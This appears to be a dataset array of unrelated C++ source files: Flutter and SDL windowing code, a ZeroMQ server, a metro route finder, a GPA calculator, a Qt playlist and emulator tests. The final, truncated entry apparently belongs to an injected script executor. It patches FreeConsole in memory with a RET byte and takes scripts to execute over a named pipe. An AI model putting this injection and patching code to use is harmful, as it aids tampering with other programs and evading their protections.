    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sixth_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../include/ProgramController.h\"\n#include <GL/gl.h>\n#include <SDL2/SDL_error.h>\n#include <SDL2/SDL_events.h>\n#include <SDL2/SDL_video.h>\n#include <cstdlib>\n#include <iostream>\n\nProgramController::ProgramController ()\n    : _state (ProgramState::RUN), _window_title (\"DOOM\"), _window (nullptr),\n      _window_width (640), _window_height (400)\n{\n}\n\nvoid\nProgramController::init_systems ()\n{\n  // SDL\n  if (SDL_Init (SDL_INIT_VIDEO) < 0)\n    {\n      fatal_error (\"Failed to initialize the SDL2 library\");\n    }\n  _window = SDL_CreateWindow (_window_title, SDL_WINDOWPOS_CENTERED,\n                              SDL_WINDOWPOS_CENTERED, _window_width,\n                              _window_height, SDL_WINDOW_OPENGL);\n  if (_window == nullptr)\n    {\n      fatal_error (\"Failed to create window with SDL2\");\n    }\n  // OpenGL\n  SDL_GLContext const gl_context{ SDL_GL_CreateContext (_window) };\n  if (gl_context == nullptr)\n    {\n      fatal_error (\"Failed to create SDL_GLContext\");\n    }\n  SDL_GL_SetAttribute (SDL_GL_DOUBLEBUFFER, true);\n  glClearColor (0, 0, 255, 255); // Opaque Blue\n};\n\nvoid\nProgramController::process_input ()\n{\n  SDL_Event e;\n  while (SDL_PollEvent (&e) > 0)\n    {\n      switch (e.type)\n        {\n        case SDL_QUIT:\n          _state = ProgramState::HALT;\n        case SDL_KEYDOWN:\n          std::cout << \"key pressed: \" << e.key.keysym.scancode << '\\n';\n          break;\n        }\n    }\n}\n\nvoid\nProgramController::draw ()\n{\n  // Clear\n  glClearDepth (1.0);\n  glClear (GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n  // Rendering\n  SDL_GL_SwapWindow (_window);\n}\n\nvoid\nProgramController::fatal_error (std::string error)\n{\n  std::cout << error << '\\n';\n  if (SDL_GetError ())\n    {\n      std::cout << \"Last SDL2 error: \" << SDL_GetError () << '\\n';\n    }\n  std::cout << \"Fatal error, enter any string to close the application\" << '\\n';\n  char input;\n  std::cin >> input;\n  SDL_Quit ();\n  exit (EXIT_FAILURE);\n}\n\nvoid\nProgramController::main_loop ()\n{\n  // Keep window open until closed\n  while (_state == ProgramState::RUN)\n    {\n      // Poll for events and update on event\n      process_input ();\n      // Update window\n      draw ();\n    }\n}\n\nvoid\nProgramController::run ()\n{\n  ProgramController::init_systems ();\n  ProgramController::main_loop ();\n};\n",
    "#include \"server.h\"\n#include <spdlog/spdlog.h>\n\nnamespace NerMCManager\n{\n    Server::Server(const str &address)\n        : context{1}, socket{context, zmq::socket_type::rep}\n    {\n        socket.bind(address);\n    }\n\n    void Server::register_json_handlers(JsonHandler handler)\n    {\n        request_handler = handler;\n    }\n\n    void Server::run()\n    {\n        spdlog::info(\"Server is running\");\n        for (;;)\n        {\n            try\n            {\n                zmq::message_t request;\n\n                socket.recv(request, zmq::recv_flags::none);\n                spdlog::info(\"Received: {}\", request.to_string());\n\n                json request_content = json::parse(request.to_string());\n                spdlog::info(\"Parsed JSON: {}\", request_content.dump());\n\n                if (!request_handler)\n                {\n                    spdlog::error(\"request_handler is not initialized!\");\n                    json error_msg = {{\"error\", \"Internal server error: request handler not set.\"}};\n                    socket.send(zmq::buffer(error_msg.dump()), zmq::send_flags::none);\n                    continue;\n                }\n\n                json reply_result = request_handler(request_content);\n                socket.send(zmq::buffer(reply_result.dump()), zmq::send_flags::none);\n                spdlog::info(\"Sent: {}\", reply_result.dump());\n            }\n            catch (json::parse_error &e)\n            {\n                str error_reason = e.what();\n                spdlog::error(\"Failed to parse JSON: {}\", error_reason);\n                json error_msg = {{\"error\", \"Failed to parse JSON: \" + error_reason}};\n\n                socket.send(zmq::buffer(error_msg.dump()), zmq::send_flags::none);\n                continue;\n            }\n            catch (zmq::error_t &e)\n            {\n                spdlog::error(\"Failed on processing message: {}\", e.what());\n                throw e;\n            }\n        }\n    }\n}\n",
    "#include<iostream>\r\n#include<vector>\r\n#include<queue>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nint MinimumCost(int n, vector<vector<int>>& path, int src, int des, vector<int>&parent)  {\r\n        vector<pair<int,int>> adj[n];\r\n        for(auto it:path){\r\n            adj[it[0]].push_back({it[2],it[1]});\r\n            adj[it[1]].push_back({it[2],it[0]});\r\n        }\r\n        vector<int> dist(n,1e9);\r\n        dist[src]=0;\r\n        priority_queue<pair<int,int>,vector<pair<int,int>>,greater<pair<int,int>>> q;\r\n        q.push({0,src});\r\n        \r\n        while(!q.empty()){\r\n        auto it=q.top();\r\n        int node=it.second;\r\n        int dis=it.first;\r\n        q.pop();\r\n\r\n        if(node==des) return dist[des];\r\n        \r\n        for(auto it:adj[node]){\r\n            int adjnode = it.second;\r\n            int w = it.first;\r\n            if(w+dis<dist[adjnode]){\r\n                dist[adjnode]=w+dis;\r\n                q.push({w+dis,adjnode});\r\n                parent[adjnode]=node;\r\n            }\r\n        }\r\n        }\r\n        return 0;\r\n    }\r\n\r\nint MinimumTime(int n, vector<vector<int>>& path, int src, int des, vector<int>&parent)  {\r\n        vector<pair<int,int>> adj[n];\r\n        for(auto it:path){\r\n            adj[it[0]].push_back({it[3],it[1]});\r\n            adj[it[1]].push_back({it[3],it[0]});\r\n        }\r\n        vector<int> time(n,1e9);\r\n        time[src]=0;\r\n        priority_queue<pair<int,int>,vector<pair<int,int>>,greater<pair<int,int>>> q;\r\n        q.push({0,src});\r\n        \r\n        while(!q.empty()){\r\n        auto it=q.top();\r\n        int node=it.second;\r\n        int dis=it.first;\r\n        q.pop();\r\n\r\n        if(node==des) return time[des];\r\n        \r\n        for(auto it:adj[node]){\r\n            int adjnode = it.second;\r\n            int w = it.first;\r\n            if(w+dis<time[adjnode]){\r\n                time[adjnode]=w+dis;\r\n                q.push({w+dis,adjnode});\r\n                parent[adjnode]=node;\r\n            }\r\n        }\r\n        }\r\n        return 0;\r\n    }\r\n    \r\nvoid PrintPath(vector<string> &stations,vector<int> &parent,int src, int des){\r\n    vector<int> st;\r\n    while(parent[des]!=des){\r\n        st.push_back(des);\r\n        des=parent[des];\r\n    }\r\n    st.push_back(src);\r\n    reverse(st.begin(),st.end());\r\n    \r\n    for(int i=0;i<st.size();i++){\r\n        cout<<stations[st[i]];\r\n        if(i!=st.size()-1) cout<<\" -> \";\r\n    }    \r\n}\r\n\r\nint main(){\r\n\r\n    vector<string> stations={\"gitanjali\",\"netaji\",\"kalighat\",\"parkstreet\",\"mgroad\",\"shyambazar\",\"dumdum\",\"noapara\",\"baranagar\",\"dakshineswar\"};\r\n    int n=stations.size();\r\n    string s,d,a;\r\n    cout<<\"Enter your Source Station - \";\r\n    cin>>s;\r\n    cout<<endl;\r\n    cout<<\"Enter your Destination Station - \";\r\n    cin>>d;\r\n    cout<<endl;\r\n    cout<<\"What do You Want to Save - time or money -- \";\r\n    cin>>a;\r\n    \r\n    vector<int> parent(n,0);\r\n    for(int i=0;i<n;i++) parent[i]=i;\r\n    vector<vector<int>> path={{0,1,50,1},{0,2,30,2},{2,3,10,1},{1,2,20,2},{1,5,100,7},{1,3,50,3},{2,4,20,4},{2,6,100,5},{3,4,30,2},{3,5,30,3},{4,5,20,2},{5,6,50,1},\r\n    {6,7,40,2},{7,8,56,4},{8,9,127,12},{6,8,99,5},{6,9,256,14},{3,7,80,9},{4,8,185,7},{2,9,360,20}};\r\n    \r\n    int src=-1,des=-1;\r\n    for(int i=0;i<n;i++){\r\n        if(s==stations[i]) src=i;\r\n        if(d==stations[i]) des=i;\r\n    }\r\n\r\n    if(src!=-1 && des !=-1) {\r\n        if(a==\"money\"){\r\n            cout<<\"-------------------------------------------------------------\"<<endl;\r\n        cout<<\"  Cost-> \"<<MinimumCost(n,path,src,des,parent)<<\"Rs.\"<<endl;\r\n        cout<<\"-------------------------------------------------------------\"<<endl;\r\n        cout<<\"  Path --> \";\r\n        PrintPath(stations,parent,src,des);\r\n        cout<<endl;\r\n        cout<<\"-------------------------------------------------------------\"<<endl;\r\n        }\r\n        else if(a==\"time\"){\r\n        cout<<\"-------------------------------------------------------------\"<<endl;    \r\n        cout<<\"  Time-> \"<<MinimumTime(n,path,src,des,parent)<<\" min\"<<endl;\r\n        cout<<\"-------------------------------------------------------------\"<<endl;\r\n        cout<<\"  Path --> \";\r\n        PrintPath(stations,parent,src,des);\r\n        cout<<endl;\r\n        cout<<\"-----------------------------------------------------\"<<endl;\r\n        }\r\n        else cout<<\"Enter Valid Information\"<<endl;\r\n    }\r\n    else cout<<\"Enter Valid Station Name!!\"<<endl;\r\n}",
    "#include <assert.h>\n#include <sstream>\n#include \"qna_tool.h\"\n#include <cmath>\n\nusing namespace std;\n\nvoid readfile (Dict& d) {\n    ifstream file(\"unigram_freq.csv\");\n    if (!file.is_open()) {\n        cout << \"Error opening the file!\" << endl;\n        return;\n    }\n    string line;\n    getline(file,line);\n    while (getline(file, line)) {\n        istringstream ss(line);\n        vector<string> row;\n        string cell;\n        while (getline(ss, cell, ',')) {\n            row.push_back(cell);\n        }\n        long long temp_count=stoll(row[1]);\n        d.insert_word(row[0],temp_count);\n    }\n    file.close();\n}\n\nclass my_para {\n    public:\n    long double para_score = 0.0;\n    Dict my_dict;\n    int bk;\n    int pgn;\n    int prg;\n    my_para()\n    {\n        para_score = 0.0;\n        my_dict = Dict();\n        int bk = -1;\n        int pgn = -1;\n        int prg = -1;\n    }\n};\n\nQNA_tool::QNA_tool(){\n    // Implement your function here\n    book=-1;\n    para_count=0;\n    para_temp=-1;\n    page_temp=-1;\n    readfile(gen_corpus);\n    for(int i = 0; i < 35;i++)\n    {\n        pref[i] = -1;\n    }\n    for(int i = 35;i < 128;i++)\n    {\n        pref[i] = 0;\n    }\n    pref[39] = -1;\n    pref[40] = -1;\n    pref[41] = -1;\n    pref[44] = -1;\n    pref[45] = -1;\n    pref[46] = -1;\n    pref[58] = -1;\n    pref[59] = -1;\n    pref[63] = -1;\n    pref[64] = -1;\n    pref[91] = -1;\n    pref[93] = -1;\n    pref[127] = -1;\n}\n\nQNA_tool::~QNA_tool(){\n    // Implement your function here\n    for(int i = 0; i < para_count;i++)\n    {\n        delete para[i];\n\n    }\n}\n\nvoid QNA_tool::insert_sentence(int book_code, int page, int paragraph, int sentence_no, string sentence){\n    // Implement your function here\n    corpus.insert_sentence(book_code, page, paragraph, sentence_no, sentence);\n    if (book==book_code && page_temp==page && para_temp==paragraph) {\n        para[para_count-1]->my_dict.insert_sentence(book_code, page, paragraph, sentence_no, sentence);\n    }\n    else {\n        my_para* new_para = new my_para();\n        new_para->my_dict.insert_sentence(book_code, page, paragraph, sentence_no, sentence);\n        new_para->bk=book_code;\n        new_para->pgn=page;\n        new_para->prg=paragraph;\n        para.push_back(new_para);\n        para_count++;\n        book=book_code;\n        page_temp=page;\n        para_temp=paragraph;\n    }\n    return;\n}\n\nvoid splitsentence(vector<string> &words,string sentence,int* pref) {\n    string word=\"\";\n    int len = sentence.size();\n    for (int i=0;i<len;i++) {\n        char x = sentence[i];\n        if (pref[x] == -1) {\n            int num = word.size();\n            if (num>0) {\n                words.push_back(word);\n            }\n            word=\"\";\n        }\n        else {\n            word+=x;\n        }\n    }\n    int num = word.size();\n    if (num>0) {\n        words.push_back(word);\n    }\n}\n\nint parent(int idx)\n{\n    return (idx-1)/2;\n}\n\nvoid hup(vector<my_para*>& heap, int shize)\n{\n    int child = shize-1;\n    int par = parent(child);\n    while(par != child && heap[par]->para_score > heap[child]->para_score)\n    {\n        my_para* tempu = heap[par];\n        heap[par] = heap[child];\n        heap[child] = tempu;\n        child = par;\n        par = parent(child);\n    }\n}\n\nvoid hdown(vector<my_para*>& heap, int shize)\n{\n    int par = 0;\n    while(2*par + 1 < shize)\n    {\n        int l = 2*par+1;\n        int r = 2*par + 2;\n        my_para* mini = heap[l];\n        if(r < shize)\n        {\n            if(heap[r]->para_score < mini->para_score)\n            {\n                mini = heap[r];\n            }\n        }\n        if(mini->para_score < heap[par]->para_score)\n        {\n            if(mini->para_score == heap[l]->para_score)\n            {\n                heap[l] = heap[par];\n                heap[par] = mini;\n                par = l;\n            }\n            else\n            {\n                heap[r] = heap[par];\n                heap[par] = mini;\n                par = r;\n            }\n        }\n        else\n        {\n            break;\n        }\n    }\n}\n\nNode* QNA_tool::get_top_k_para(string question, int k) {\n    // Implement your function here\n    vector<string> words;\n    splitsentence(words,question,pref);\n    int sz=words.size();\n    long double qry[sz];\n    for(int i = 0; i < sz;i++)\n    {\n        long long a = gen_corpus.get_word_count(words[i]);\n        long long b = corpus.get_word_count(words[i]);\n        long double one = 1;\n        qry[i] = (one+b)/(one+a);\n    }\n    for (long long j=0;j<para_count;j++) {\n        for (int i=0;i<sz;i++) {\n            para[j]->para_score+= qry[i]*para[j]->my_dict.get_word_count(words[i]);\n        }\n        if(j < k)\n        {\n            hup(para,j+1);\n        }\n        else if(para[j]->para_score > para[0]->para_score)\n        {\n            my_para* tp = para[j];\n            para[j] = para[0];\n            para[0] = tp;\n            hdown(para,k);\n        }\n    }\n    //sort(para.rbegin(),para.rend(),my_compare);\n    Node* head = new Node(para[0]->bk,para[0]->pgn,para[0]->",
    "/*\r\n#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nstruct Course\r\n{\r\n    string name;\r\n    string grade;\r\n    int credit;\r\n    double gradePoint;\r\n};\r\n\r\nstruct Semester\r\n{\r\n    Course courses[10];\r\n    int numCourses;\r\n    double gpa;\r\n    int totalCredits;\r\n    double totalPointsEarned;\r\n};\r\n\r\nstruct Student\r\n{\r\n    string name;\r\n    Semester semesters[10];\r\n    int numSemesters;\r\n    double cgpa;\r\n};\r\n\r\ndouble calculateGradePoint(string grade)\r\n{\r\n    if (grade == \"A+\" || grade == \"A\")\r\n    {\r\n        return 4.0;\r\n    }\r\n    else if (grade == \"A-\")\r\n    {\r\n        return 3.67;\r\n    }\r\n    else if (grade == \"B+\")\r\n    {\r\n        return 3.33;\r\n    }\r\n    else if (grade == \"B\")\r\n    {\r\n        return 3.0;\r\n    }\r\n    else if (grade == \"B-\")\r\n    {\r\n        return 2.67;\r\n    }\r\n    else if (grade == \"C+\")\r\n    {\r\n        return 2.33;\r\n    }\r\n    else if (grade == \"C\")\r\n    {\r\n        return 2.0;\r\n    }\r\n    else if (grade == \"C-\")\r\n    {\r\n        return 1.67;\r\n    }\r\n    else if (grade == \"D+\")\r\n    {\r\n        return 1.33;\r\n    }\r\n    else if (grade == \"D\")\r\n    {\r\n        return 1.0;\r\n    }\r\n    else\r\n    {\r\n        return 0.0;\r\n    }\r\n}\r\n\r\nvoid calculateCGPA(Student& student)\r\n{\r\n    double cumulativePointsEarned = 0.0;\r\n    int cumulativeCredits = 0;\r\n\r\n    for (int sem = 0; sem < student.numSemesters; sem++)\r\n    {\r\n        cumulativePointsEarned += student.semesters[sem].totalPointsEarned;\r\n        cumulativeCredits += student.semesters[sem].totalCredits;\r\n    }\r\n\r\n    student.cgpa = cumulativePointsEarned / cumulativeCredits;\r\n}\r\n\r\nint main()\r\n{\r\n    int option = 0;\r\n    Student students[10];\r\n    int numStudents = 0;\r\n\r\n    cout << \"\\n\\t\\t\\t\\t\\t=============================== \" << endl;\r\n    cout << \"\\t\\t\\t\\t\\t|       GPA CALCULATOR        |\" << endl;\r\n    cout << \"\\t\\t\\t\\t\\t===============================\" << endl << endl;\r\n\r\n    while (true)\r\n    {\r\n        cout << \"Which option would you perform ?\" << endl;\r\n        cout << \"1- Calculate GPA\" << endl;\r\n        cout << \"2- Grading Policy\" << endl;\r\n        cout << \"3- See All Students' CGPAs\" << endl;\r\n        cout << \"4- Exit\" << endl;\r\n        cout << \"-------------------------------\" << endl;\r\n        cout << \"Select option: \";\r\n        cin >> option;\r\n        cout << \"-------------------------------\" << endl;\r\n\r\n        if (option == 4)\r\n        {\r\n            cout << \"Exiting...\" << endl;\r\n            cout << \"-------------------------------\" << endl;\r\n            break;\r\n        }\r\n\r\n        switch (option) {\r\n        case 1:\r\n        {\r\n            cin.ignore();\r\n            Student& student = students[numStudents];\r\n            cout << \"Enter student's name: \";\r\n            getline(cin, student.name);\r\n            cout << \"-------------------------------\" << endl;\r\n            cout << \"\\nHow many semesters would you like to enter: \";\r\n            cin >> student.numSemesters;\r\n            cout << \"------------------------------------------\" << endl;\r\n            cin.ignore();\r\n\r\n            for (int sem = 0; sem < student.numSemesters; sem++)\r\n            {\r\n                Semester& semester = student.semesters[sem];\r\n                cout << \"Enter number of courses for semester \" << sem + 1 << \": \";\r\n                cin >> semester.numCourses;\r\n                cout << \"----------------------------------------\" << endl;\r\n                cin.ignore();\r\n\r\n                semester.totalPointsEarned = 0.0;\r\n                semester.totalCredits = 0;\r\n\r\n                for (int i = 0; i < semester.numCourses; i++)\r\n                {\r\n                    Course& c = semester.courses[i];\r\n                    cout << \"Enter course name: \";\r\n                    getline(cin, c.name);\r\n                    cout << \"Enter the Grade: \";\r\n                    getline(cin, c.grade);\r\n                    cout << \"Enter the Credit Hours: \";\r\n                    cin >> c.credit;\r\n                    cin.ignore();\r\n                    cout << \"----------------------------------------\" << endl;\r\n\r\n                    c.gradePoint = calculateGradePoint(c.grade);\r\n                    semester.totalPointsEarned += c.gradePoint * c.credit;\r\n                    semester.totalCredits += c.credit;\r\n                }\r\n\r\n                semester.gpa = semester.totalPointsEarned / semester.totalCredits;\r\n            }\r\n\r\n            calculateCGPA(student);\r\n\r\n            cout << \"Your CGPA is: \" << student.cgpa << endl;\r\n            cout << \"----------------------------------------\" << endl;\r\n\r\n            for (int sem = 0; sem < student.numSemesters; sem++)\r\n            {\r\n                Semester& semester = student.semesters[sem];\r\n                cout << \"Semester \" << sem + 1 << \" SGPA: \" << semester.gpa << endl;\r\n                cout << \"\\nCourses in Semester \" << sem + 1 << \":\" << endl;\r\n                for (int j = 0; j < semester.numCourses; j++)\r\n                {\r\n                    cout << \"Course: \" << semester.courses[j].name << \", Grade: \" <",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sign_up\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"SongList.h\"\n\nvoid SongList::addSong(QString filePath) {\n    QUrl url(QUrl::fromLocalFile(filePath));\n    this->append(filePath);\n}\n\nSongList::SongList(): QList<QUrl>() {}\n\nQUrl& SongList::getItem(int index) {\n    return this->operator[](index);\n}\n\nvoid SongList::unique() {;\n    int len = this->length();\n    for (int i = 0; i < len; i++) {\n        for (int j = i + 1; j < len; j++) {\n            if (this->getItem(i) == this->getItem(j)) {\n                this->getItem(j) = \"0\";\n            }\n        }\n    }\n    this->removeAll(QUrl(\"0\"));\n}\n\nQStringList SongList::returnPlayList() {\n    QStringList list;\n    for (auto& fileNameUrl : *this) {\n        list.append(fileNameUrl.toString().replace(\".mp3\", \"\"));\n    }\n    return list;\n}\n\nbool SongList::addToMyLove(const QString& sourceFilePath, const QString& filename) {\n    qDebug() << sourceFilePath << endl;\n    QFile sourceFile(sourceFilePath);\n    if (!sourceFile.exists()) {\n            qDebug() << \"Source file does not exist.\";\n            return false;\n        }\n    QDir destinationDir(\"D:\\\\MusicPlayer\\\\myLove\");\n    if (!destinationDir.exists()) {\n        qDebug() << \"Destination directory does not exist.\";\n        return false;\n    }\n     if (sourceFile.copy(\"D:\\\\MusicPlayer\\\\myLove\\\\\" + filename)) {\n                qDebug() << \"File copied successfully to D:\\\\MusicPlayer\\\\myLove\" << endl;\n                qDebug() << sourceFile.errorString();\n                return true;\n            } else {\n                qDebug() << \"Failed to copy file to D:\\\\MusicPlayer\\\\myLove\" << endl;\n                return false;\n            }\n}\n\nbool SongList::deleteFromMyLove(const QString& filename) {\n    QDir destinationDir(\"D:\\\\MusicPlayer\\\\myLove\");\n    if (!destinationDir.exists()) {\n        qDebug() << \"Destination directory does not exist.\";\n        return true;\n    }\n    destinationDir.remove(\"D:\\\\MusicPlayer\\\\myLove\\\\\" + filename);\n    qDebug() << 'deleted!!!';\n}\n",
    "#include <gtest/gtest.h>\n\n#include \"test_vdp.h\"\n#include \"helpers/random.h\"\n#include \"exception.hpp\"\n\n#include \"vdp/impl/plane_type.h\"\nusing genesis::vdp::impl::plane_type;\n\nusing namespace genesis::test;\n\nstatic std::array<genesis::vdp::output_color, 1024> plane_buffer;\n\nTEST(VDP_RENDER, BACKGROUND_COLOR)\n{\n\tvdp vdp;\n\tauto& render = vdp.render();\n\tauto& cram = vdp.cram();\n\tauto& regs = vdp.registers();\n\n\t// there are 64 colors in total (4 palette * 16 colors each)\n\tauto colors = random::next_few<std::uint16_t>(64);\n\tASSERT_EQ(64, colors.size());\n\n\tfor(std::uint16_t color = 0; color < colors.size(); ++color)\n\t\tcram.write(color * 2, colors.at(color));\n\n\tstd::uint16_t color = 0;\n\tfor(std::uint8_t palette = 0; palette < 4; ++palette)\n\t{\n\t\tregs.R7.PAL = palette;\n\t\tfor(std::uint8_t pos = 0; pos < 16; ++pos)\n\t\t{\n\t\t\tregs.R7.COL = pos;\n\n\t\t\tauto expected_color = colors.at(color++);\n\t\t\tASSERT_EQ(expected_color, render.background_color())\n\t\t\t\t<< \"palette: \" << (int)palette << \", color number: \" << (int)pos;\n\t\t}\n\t}\n}\n\nstd::vector<std::uint8_t> random_tail()\n{\n\treturn random::next_few_in_range<std::uint8_t>(64, 0, 0xF);\n}\n\nstd::uint8_t random_palette()\n{\n\treturn random::in_range<std::uint8_t>(0, 3);\n}\n\nplane_type random_plane()\n{\n\treturn random::pick({plane_type::a, plane_type::b, plane_type::w});\n}\n\nstd::uint8_t get_tail_index(std::uint8_t row, std::uint8_t col,\n\tbool horizontal_flip = false, bool vertical_flip = false)\n{\n\tif(row > 8 || col > 8)\n\t\tthrow genesis::internal_error();\n\n\tif(vertical_flip)\n\t\trow = 7 - row;\n\n\tif(horizontal_flip)\n\t\tcol = 7 - col;\n\n\treturn (row * 8) + col;\n}\n\ngenesis::vdp::output_color read_color(vdp& vdp, std::uint8_t palette_idx, std::uint8_t col_idx)\n{\n\tif(col_idx == 0)\n\t\treturn genesis::vdp::TRANSPARENT_COLOR;\n\treturn vdp.cram().read_color(palette_idx, col_idx);\n}\n\ntemplate<class T>\nvoid copy_tail(vdp& vdp, std::uint32_t address, const T& tail)\n{\n\tif(tail.size() != 64) // support only 8x8 pixels for now\n\t\tthrow genesis::internal_error();\n\n\tauto& vram = vdp.vram();\n\tint i = 0;\n\tstd::uint8_t value = 0;\n\tfor(auto color : tail)\n\t{\n\t\tif(color < 0 || color > 0xF)\n\t\t\tthrow genesis::internal_error();\n\n\t\tif(i % 2 == 0)\n\t\t{\n\t\t\tvalue = color << 4;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tvalue |= color;\n\t\t\tvram.write<std::uint8_t>(address, value);\n\t\t\taddress += 1;\n\t\t}\n\t\t++i;\n\t}\n}\n\nstd::uint16_t get_plane_entry(std::uint32_t tail_address,\n\tbool horizintal_flip = false, bool vertical_flip = false, std::uint8_t palette = 0)\n{\n\tif(palette > 4)\n\t\tthrow std::invalid_argument(\"palette\");\n\n\tstd::uint16_t plane_entry = 0;\n\tplane_entry |= tail_address >> 5;\n\tplane_entry |= palette << 13;\n\n\tif(horizintal_flip)\n\t\tplane_entry |= 1 << 11;\n\n\tif(vertical_flip)\n\t\tplane_entry |= 1 << 12;\n\n\treturn plane_entry;\n}\n\nvoid fill_plane_table(vdp& vdp, plane_type plane, std::uint32_t plane_address, std::uint16_t plane_entry)\n{\n\tauto& sett = vdp.sett();\n\tauto& vram = vdp.vram();\n\tauto& render = vdp.render();\n\n\tstd::uint32_t expected_plane_address = 0;\n\tswitch (plane)\n\t{\n\tcase plane_type::a:\n\t\texpected_plane_address = sett.plane_a_address();\n\t\tbreak;\n\tcase plane_type::b:\n\t\texpected_plane_address = sett.plane_b_address();\n\t\tbreak;\n\tcase plane_type::w:\n\t\texpected_plane_address = sett.plane_w_address();\n\t\tbreak;\n\tdefault: throw genesis::internal_error();\n\t}\n\n\tif(plane_address != expected_plane_address)\n\t\tthrow genesis::internal_error();\n\n\tauto plane_entries = (render.plane_hight_in_pixels(plane) / 8)\n\t\t* (render.plane_width_in_pixels(plane) / 8);\n\tfor(unsigned i = 0; i < plane_entries; ++i)\n\t{\n\t\tvram.write<std::uint16_t>(plane_address, plane_entry);\n\t\tplane_address += sizeof(plane_entry);\n\t}\n}\n\nvoid fill_cram(vdp& vdp)\n{\n\tauto& cram = vdp.cram();\n\n\tfor(int i = 0; i < 64; ++i)\n\t{\n\t\tstd::uint16_t addr = i * 2;\n\t\tcram.write(addr, random::next<std::uint16_t>());\n\t}\n}\n\nauto get_plane_row(vdp& vdp, plane_type plane, unsigned row_number)\n{\n\treturn vdp.render().get_plane_row(plane, row_number, plane_buffer);\n}\n\nstd::uint32_t set_plane_address(vdp& vdp, plane_type plane, std::uint8_t address)\n{\n\tauto& regs = vdp.registers();\n\tauto& sett = vdp.sett();\n\n\tswitch (plane)\n\t{\n\tcase plane_type::a:\n\t\tregs.R2.PA5_3 = address; // plane A\n\t\treturn sett.plane_a_address();\n\tcase plane_type::b:\n\t\tregs.R4.PB2_0 = address; // plane B\n\t\treturn sett.plane_b_address();\n\tcase plane_type::w:\n\t\tregs.R3.W5_1 = address;\n\t\treturn sett.plane_w_address();\n\tdefault: throw genesis::internal_error();\n\t}\n}\n\nvoid set_plane_dimension(vdp& vdp, plane_type plane)\n{\n\tauto& regs = vdp.registers();\n\n\tswitch (plane)\n\t{\n\tcase plane_type::a:\n\tcase plane_type::b:\n\t\t// use constant plane size for now\n\t\tregs.R16.H = 0b01; // 64\n\t\tregs.R16.W = 0b01; // 64\n\t\tbreak;\n\tcase plane_type::w:\n\t\tregs.R12.RS0 = random::in_range<std::uint8_t>(0, 1);\n\t\tbreak;\n\n\tdefault: throw genesis::internal_error();\n\t}\n}\n\ntemplate<class T>\nvoid setup_plane_test(vdp& vdp, plane_type plane_type, bool hflip, bool vflip, \n\tstd::uint8_t palette, const T& tail)\n{\n\t// use constant address for simple test\n\tconst std::uint32_t tail_address = 0",
    "#include \"Global.h\"\n#include \"Environment.h\"\n#include \"Drawing/ImGuiHook.h\"\n\n\n//Functions\nvoid DebugConsole()\n{\n\tDWORD OldPerm;\n\tVirtualProtect(&FreeConsole, 1, PAGE_EXECUTE_READWRITE, &OldPerm);\n\t*reinterpret_cast<BYTE*>(&FreeConsole) = 0xC3;\n\tVirtualProtect(&FreeConsole, 1, OldPerm, NULL);\n\tAllocConsole();\n\tSetConsoleTitle(\"Debug Console\");\n\tfreopen(\"CONOUT$\", \"w\", stdout);\n\tfreopen(\"CONIN$\", \"r\", stdin);\n}\n\nint Main()\n{\n#if ConsoleOpen\n\tDebugConsole();\n#endif // !Debug\n\tif (Env::Primary::CreateEnvironment())//Env::StartUp()\n\t{\n\t\tstd::string Input;\n\t\twhile (true)\n\t\t{\n#if ConsoleInput\n\t\t\tstd::getline(std::cin, Input);\n\t\t\tEnv::Primary::Execute(Input);\n#else\n\t\t\tstd::string WholeScript = \"\";\n\t\t\tHANDLE hPipe;\n\t\t\tchar buffer[999999];\n\t\t\tDWORD dwRead;\n\t\t\tstd::string PipeNamed = \"\\\\\\\\.\\\\pipe\\\\\" + std::string(PipesName);\n\t\t\thPipe = CreateNamedPipe(TEXT(PipeNamed.c_str()),\n\t\t\t\tPIPE_ACCESS_DUPLEX | 